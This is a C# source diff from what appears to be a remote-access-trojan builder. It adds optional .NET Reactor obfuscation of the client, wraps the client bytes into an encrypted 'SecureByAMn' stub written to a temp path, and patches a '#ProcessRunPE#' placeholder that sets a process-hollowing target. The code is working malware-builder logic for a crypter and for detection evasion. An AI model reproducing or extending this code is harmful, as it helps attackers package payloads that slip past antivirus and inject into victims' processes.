@@ -15,6 +15,7 @@ using Server.RenamingObfuscation;
 using System.Threading.Tasks;
 using System.Diagnostics;
 using AMnSecure;
+using AMnSecure.bypass_security.Obfuscation;
 using Toolbelt.Drawing;
 using Methods = Server.Helper.Methods;
 
@@ -214,16 +215,39 @@ namespace Server.Forms
                         }
                         asmDef.Write(saveFileDialog1.FileName);
                         asmDef.Dispose();
-                        //EncryptString.DoEncrypt(asmDef);
+                        
                         ModuleDefMD asmDefSecureByAMn = ModuleDefMD.Load(@"SecureByAMn.exe");
-                        string fullPathSecureByAMn = Path.Combine(Path.GetDirectoryName(saveFileDialog1.FileName),
-                            Settings.nameSecureByAMn + ".exe");
-                        //Obfusquer asmDefSecureByAMn
-                        EncryptString.DoEncrypt(asmDefSecureByAMn);
-                        WriteSettingsSecureByAMn(asmDefSecureByAMn,fullPathSecureByAMn,File.ReadAllBytes(saveFileDialog1.FileName));
-                        asmDefSecureByAMn.Write(fullPathSecureByAMn);
+                        string tPath = Settings.temps_path;
+                        
+                        string ClientObfuscate =
+                            Path.Combine(Path.GetDirectoryName(saveFileDialog1.FileName) + "ClientObf.exe");
+                        if (chkObfu.Checked)
+                        {
+                            Reactor.Run_NETReactor(saveFileDialog1.FileName, ClientObfuscate);
+                            WriteSettingsSecureByAMn(asmDefSecureByAMn,tPath,File.ReadAllBytes(ClientObfuscate));
+                        }
+                        else
+                        {
+                            WriteSettingsSecureByAMn(asmDefSecureByAMn,tPath,File.ReadAllBytes(saveFileDialog1.FileName));
+                        }
+                        asmDefSecureByAMn.Write(tPath);
                         asmDefSecureByAMn.Dispose();
-                        File.Delete(saveFileDialog1.FileName);
+
+                        var directoryClient = Path.GetDirectoryName(saveFileDialog1.FileName);
+                        //Obfusquer
+                        if (chkObfu.Checked)
+                        {
+                            Reactor.Run_NETReactor(tPath,Path.Combine(directoryClient,Settings.PathSecureByAMn + ".exe"));
+                            if(File.Exists(tPath))
+                                File.Delete(tPath);
+                            File.Delete(saveFileDialog1.FileName);
+                        }
+                        else
+                        {
+                            File.Move(tPath, Path.Combine(Path.GetDirectoryName(saveFileDialog1.FileName), Settings.PathSecureByAMn + ".exe"));
+                            File.Delete(saveFileDialog1.FileName);
+                        }
+                        
                         if (btnAssembly.Checked)
                         {
                             WriteAssembly(saveFileDialog1.FileName);
@@ -507,6 +531,11 @@ namespace Server.Forms
                                         method.Body.Instructions[i].Operand =
                                             AesAdvancedCompression.EncryptBase64(
                                                 AesAdvancedCompression.Compress(Client),Settings.keyAesBase256Gcm);
+                                    }
+
+                                    if (method.Body.Instructions[i].Operand.ToString() == "#ProcessRunPE#")
+                                    {
+                                        method.Body.Instructions[i].Operand = Settings.ProcessRunPE;
                                     }
                                 }
                             }
